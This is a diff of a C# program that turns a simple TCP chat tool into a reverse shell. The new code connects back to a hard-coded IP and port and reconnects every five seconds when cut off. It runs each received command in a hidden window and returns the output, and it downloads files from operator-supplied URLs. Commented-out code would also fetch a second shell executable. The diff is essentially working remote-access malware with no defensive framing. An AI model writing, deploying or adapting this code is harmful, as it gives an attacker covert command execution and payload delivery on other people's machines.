@@ -1,35 +1,76 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
+using System.Net;
 using System.Net.Sockets;
-
-namespace Cliente
+using System.Diagnostics;
+using System.Threading;
+using System.Text.RegularExpressions;
+namespace Client
 {
     class Program
     {
-        public static NetworkStream socket_cliente;
-        public static void Receber_comando()
+        static Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        static int shelldownloadCount = 0;
+
+        static void SocketConnect()
         {
-            try
+
+            IPEndPoint connectAddress = new IPEndPoint(IPAddress.Parse("192.168.0.97"), 8000); // Server IP & PORT 
+            sck.Connect(connectAddress);
+        }
+
+        static void DownloadFile()
+        {
+            WebClient downloadFile = new WebClient();
+            byte[] requestUrl = Encoding.Default.GetBytes("Enter URL: ");
+            sck.Send(requestUrl, 0, requestUrl.Length, 0);
+            byte[] urlbuffer = new byte[255];
+            int recUrl = sck.Receive(urlbuffer, 0, urlbuffer.Length, 0);
+            Array.Resize(ref urlbuffer, recUrl);
+            string url = Encoding.Default.GetString(urlbuffer);
+            string replacment = Regex.Replace(url, @"\n", "");
+            downloadFile.DownloadFileAsync(new Uri(replacment), @"c:\Users\Public\file");
+
+
+        }
+        /*static void DownloadShell()
+        {
+            byte[] downloadingMsg = Encoding.Default.GetBytes("Downloading Second shell on port 9000\n");
+            sck.Send(downloadingMsg, 0, downloadingMsg.Length, 0);
+            WebClient secondShell = new WebClient();
+            secondShell.DownloadFile(new Uri("www.www.www"), @"C:\Users\Public\SecondSession.exe"); //second client session enter remote address
+        }*/
+
+
+        public static bool ExecuteCommand()
+        {
+
+
+            /*if(shelldownloadCount == 0)
             {
-                byte[] RecPacket = new byte[10000];
-                socket_cliente.Read(RecPacket, 0, RecPacket.Length);
-                socket_cliente.Flush();
-                string tamanho_bytes = Encoding.Default.GetString(RecPacket);
-                int tamanho = Convert.ToInt16(tamanho_bytes);
-                Console.WriteLine("len: " + tamanho);
+                DownloadShell();
+                shelldownloadCount = 1;
+            }*/
 
-                byte[] r_comando = new byte[tamanho];
-                socket_cliente.Read(r_comando, 0, r_comando.Length);
-                socket_cliente.Flush();
-                string Command = Encoding.Default.GetString(r_comando);
-                Console.WriteLine(Command);
-                socket_cliente.Flush();
 
-                /*
-                 
+            byte[] buffer = new byte[255]; // buffer for recieved command
+            int rec = sck.Receive(buffer, 0, buffer.Length, 0); // receving
+
+            Array.Resize(ref buffer, rec);
+            string command = Encoding.Default.GetString(buffer); // recieved command from bytes to string
+
+
+            if (command == "quit\n") // quit and close socket
+            {
+                sck.Close();
+            }
+            else if (command == "downloadfile\n")
+            {
+                DownloadFile();
+            }
+            else
+            {
                 // execute command
                 Process p = new Process();
                 p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
@@ -49,35 +90,42 @@ namespace Cliente
                 sck.Send(outputbuf, 0, outputbuf.Length, 0);
                 sck.Send(errorbuf, 0, errorbuf.Length, 0);
 
-                */
-
             }
-            catch
-            {
-
-                Console.WriteLine("Desconectado!");
-                Console.ReadKey();
-                socket_cliente.Close();
-            }
-
+            return false;
         }
 
-        //
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
-            TcpListener listar = new TcpListener(2000);
-            listar.Start();
-            TcpClient conexao = listar.AcceptTcpClient();
-            socket_cliente = conexao.GetStream();
+
             while (true)
             {
-                Console.Write("digite uma msg:");
-                string comando = Console.ReadLine();
-                byte[] conteudo = Encoding.ASCII.GetBytes(comando);
-                socket_cliente.Write(conteudo, 0, conteudo.Length);
-                socket_cliente.Flush();
-                Receber_comando();
+                bool socketDEAD = false;
+                try
+                {
+                    SocketConnect();
+                    while (socketDEAD != true)
+                    {
+                        socketDEAD = ExecuteCommand();
+                    }
+                    sck.Close();
+
+                }
+                catch (Exception ex)
+                {
+
+                    System.Threading.Thread.Sleep(5000); // Sleep time before reconnect
+                    sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+
+                }
+
+
+
+
             }
+
+
+
+
         }
     }
 }
